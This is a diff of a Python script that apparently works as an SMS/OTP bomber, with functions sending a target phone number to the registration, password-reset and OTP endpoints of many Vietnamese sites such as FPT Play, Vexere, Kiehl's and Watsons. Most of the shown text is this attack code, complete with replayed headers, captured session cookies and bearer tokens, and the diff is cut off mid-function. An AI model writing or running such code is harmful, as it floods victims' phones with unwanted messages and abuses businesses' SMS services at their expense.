@@ -4,6 +4,7 @@ import sys
 import urllib3
 from colorama import Fore, Style, init
 import random
+import json
 import string
 def generate_random_email(domain='example.com'):
     # Tạo phần tên email ngẫu nhiên
@@ -535,112 +536,6 @@ def vieon():
         print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def fptreg():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json; charset=UTF-8',
-        'origin': 'https://fptplay.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://fptplay.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-did': 'B274C650E1693D1F',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
-    }
-
-    try:
-        response = requests.post(
-            'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=6j5x6nett8jkCfcK_qAYHg&e=1721803584&device=Opera(version%253A112.0.0.0)&drm=1',
-            headers=headers,
-            json=json_data,
-        )
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("FPTREG | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("FPTREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def fptreset():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json; charset=UTF-8',
-        'origin': 'https://fptplay.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://fptplay.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-did': 'B274C650E1693D1F',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
-    }
-
-    try:
-        response = requests.post(
-            'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=oIfVfDi61oLPs9G1htsfEw&e=1721803775&device=Opera(version%253A112.0.0.0)&drm=1',
-            headers=headers,
-            json=json_data,
-        )
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("FPTRESET | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("FPTRESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def fptresend():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json; charset=UTF-8',
-        'origin': 'https://fptplay.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://fptplay.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-did': 'B274C650E1693D1F',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'email': '',
-        'country_code': 'VN',
-        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
-    }
-
-    try:
-        response = requests.post(
-            'https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=f8BaG8rdfwZq825-0vCokg&e=1721803855&device=Opera(version%253A112.0.0.0)&drm=1',
-            headers=headers,
-            json=json_data,
-        )
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("FPTRESEND | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("FPTRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def winmart():
     headers = {
@@ -1340,7 +1235,7 @@ def fptlongchauzl():
     }
 
     json_data = {
-        'phoneNumber': '0357156321',
+        'phoneNumber': sdt,
         'otpType': 1,
         'fromSys': 'WEBKHLC',
     }
@@ -1355,45 +1250,6 @@ def fptlongchauzl():
         print("FPTLONGCHAUZL | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("FPTLONGCHAUZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def thuocsi():
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json',
-        'origin': 'https://thuocsi.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://thuocsi.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-request-id': '1721576026076',
-        'x-request-path': '/marketplace/customer/v1/register',
-    }
-
-    json_data = {
-        'scope': 'DENTISTRY',
-        'businessName': 'Nha khoa',
-        'address': '53 et 3',
-        'provinceCode': '95',
-        'districtCode': '958',
-        'wardCode': '31912',
-        'phone': sdt,
-        'referCode': '',
-        'isNewFlow': True,
-        'verificationCode': '',
-    }
-
-    try:
-        response = requests.post('https://v2api.thuocsi.vn/marketplace/customer/v1/register', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("THUOCSI | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("THUOCSI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def pantio():
     headers = {
@@ -1805,66 +1661,6 @@ def vietair():
     except requests.exceptions.RequestException:
         print("VIETAIR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def vexere():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN',
-        'authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOjIsInVzciI6ImZlIiwiY2lkIjoiYTRlYWM1MDAtMzYyNC0xMWU1LWFjOWUtMDkxMjRjNjAxMDEzIiwiZXhwIjoxNzIzNzA2OTM5fQ.ZPwjlOKyhe9MFkIAUYJZHNgKV-aDx9VG8L6HuqW9DLw',
-        'content-type': 'application/json',
-        'origin': 'https://vexere.com',
-        'priority': 'u=1, i',
-        'referer': 'https://vexere.com/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    json_data = {
-        'phone': '+840357156322',
-        'lang': 'vi-VN',
-    }
-
-    try:
-        response = requests.post('https://user-profile-service.vexere.com/v2/auth/send_otp', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("VEXERE | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("VEXERE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def atadi():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/json;charset=UTF-8',
-        'origin': 'https://www.atadi.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://www.atadi.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    json_data = {
-        'type': 'phone',
-        'phone': sdt,
-        'lastMessage': 'NEW_MEMBER_UI_2',
-    }
-
-    try:
-        response = requests.post('https://www.atadi.vn/addon/tds/register2', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("ATADI | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("ATADI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def etrip4u():
     cookies = {
         'language': 'vi',
@@ -1909,45 +1705,6 @@ def etrip4u():
         print("ETRIP4U | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("ETRIP4U | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def tinyworld():
-    cookies = {
-        'connect.sid': 's%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
-    }
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
-        # 'cookie': 'connect.sid=s%3AHmACN8Z1lX11BIubkvf3PeJnysiaX-nN.AFYPV3%2BEkso8%2Fuot1D3Xg7SCuuEFLcaS18gNzdO%2B%2F1I',
-        'origin': 'https://prod-tini-id.nkidworks.com',
-        'priority': 'u=0, i',
-        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com/dia-diem-va-gia-ve.html',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    data = {
-        '_csrf': '',
-        'clientId': '609168b9f8d5275ea1e262d6',
-        'redirectUrl': 'https://tiniworld.com/dia-diem-va-gia-ve.html',
-        'phone': sdt,
-    }
-
-    try:
-        response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("TINYWORLD | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("TINYWORLD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def chudu24():
     cookies = {
@@ -2076,59 +1833,6 @@ def hasaki():
     except requests.exceptions.RequestException:
         print("HASAKI.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def kiehls():
-    cookies = {
-        'dwac_a5b49a2c3a0f1f7ca3ef9715a5': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true',
-        'cqcid': 'bclcwbad9uTM4EsEYxVq4hk5mq',
-        'cquid': '||',
-        'sid': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo',
-        'dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd': 'bclcwbad9uTM4EsEYxVq4hk5mq',
-        '__cq_dnt': '0',
-        'dw_dnt': '0',
-        'dwsid': '766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==',
-        '__cf_bm': 'XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw',
-        'cf_clearance': 'oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q',
-        'tracking': '%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded',
-        # 'cookie': 'dwac_a5b49a2c3a0f1f7ca3ef9715a5=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true; cqcid=bclcwbad9uTM4EsEYxVq4hk5mq; cquid=||; sid=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo; dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd=bclcwbad9uTM4EsEYxVq4hk5mq; __cq_dnt=0; dw_dnt=0; dwsid=766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==; __cf_bm=XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw; cf_clearance=oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q; tracking=%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
-        'origin': 'https://www.kiehls.com.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://www.kiehls.com.vn/vi_VN/account-login',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    params = {
-        'ajax': 'true',
-    }
-
-    data = {
-        'cellularPhone': sdt,
-    }
-
-    try:
-        response = requests.post(
-            'https://www.kiehls.com.vn/on/demandware.store/Sites-kiehls-vn-ng-Site/vi_VN/SMSVerification-SendSMS',
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            data=data,
-        )
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("KIEHLS | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("KIEHLS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def emart():
     cookies = {
         'emartsess': 'hk4hc7j1mnphvk2tg5dld4j0d3',
@@ -2170,122 +1874,6 @@ def emart():
         print("EMART | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("EMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def watsons():
-    cookies = {
-        'dtCookie': 'v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0',
-        'PIM-SESSION-ID': 'KeLTcCvBcFaAM7Ks',
-        'ROUTE': '.api-6df67c4656-d6j6p',
-        'AKA_A2': 'A',
-        'ak_bmsc': 'E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0',
-        'authorization': 'eIoVNH5XuB4bIiORjaaVO1iXwSU',
-        'token_type': 'guest',
-        'bm_mi': 'E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1',
-        '_abck': '2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1',
-        'bm_sv': '65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1',
-        'bm_sz': '38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
-    }
-
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'authorization': 'bearer eIoVNH5XuB4bIiORjaaVO1iXwSU',
-        'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
-        'content-type': 'application/json',
-        # 'cookie': 'dtCookie=v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; PIM-SESSION-ID=KeLTcCvBcFaAM7Ks; ROUTE=.api-6df67c4656-d6j6p; AKA_A2=A; ak_bmsc=E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0; authorization=eIoVNH5XuB4bIiORjaaVO1iXwSU; token_type=guest; bm_mi=E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1; _abck=2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1; bm_sv=65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1; bm_sz=38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
-        'expires': '0',
-        'if-modified-since': 'Mon, 22 Jul 2024 08:17:50 GMT',
-        'origin': 'https://www.watsons.vn',
-        'pragma': 'no-cache',
-        'priority': 'u=1, i',
-        'queue-target': 'https://www.watsons.vn/vi/register',
-        'queueit-target': 'https://www.watsons.vn/vi/register',
-        'referer': 'https://www.watsons.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'vary': '*',
-    }
-
-    params = {
-        'formId': 'registrationOTPForm_Web3',
-        'lang': 'vi',
-        'curr': 'VND',
-    }
-
-    json_data = {
-        'uid': '',
-        'action': 'REGISTRATION',
-        'countryCode': '84',
-        'target': sdt,
-        'type': 'SMS',
-    }
-
-    try:
-        response = requests.post(
-            'https://api.watsons.vn/api/v2/wtcvn/otpToken',
-            params=params,
-            cookies=cookies,
-            headers=headers,
-            json=json_data,
-        )
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("WATSONS | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("WATSONS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def hanoia():
-    cookies = {
-        'PHPSESSID': 'ah759kbp93umoqr5180jcbf75c',
-        'form_key': 'dlinj8ESlS5lQx06',
-        'form_key': 'dlinj8ESlS5lQx06',
-        'mage-cache-storage': '%7B%7D',
-        'mage-cache-storage-section-invalidation': '%7B%7D',
-        'mage-cache-sessid': 'true',
-        'recently_viewed_product': '%7B%7D',
-        'recently_viewed_product_previous': '%7B%7D',
-        'recently_compared_product': '%7B%7D',
-        'recently_compared_product_previous': '%7B%7D',
-        'product_data_storage': '%7B%7D',
-        'mage-messages': '',
-        'private_content_version': '88ede4a3f3efc946fd38132bc5254912',
-        'section_data_ids': '%7B%7D',
-    }
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'PHPSESSID=ah759kbp93umoqr5180jcbf75c; form_key=dlinj8ESlS5lQx06; form_key=dlinj8ESlS5lQx06; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=88ede4a3f3efc946fd38132bc5254912; section_data_ids=%7B%7D',
-        'origin': 'https://hanoia.com',
-        'priority': 'u=1, i',
-        'referer': 'https://hanoia.com/customer/account/create/',
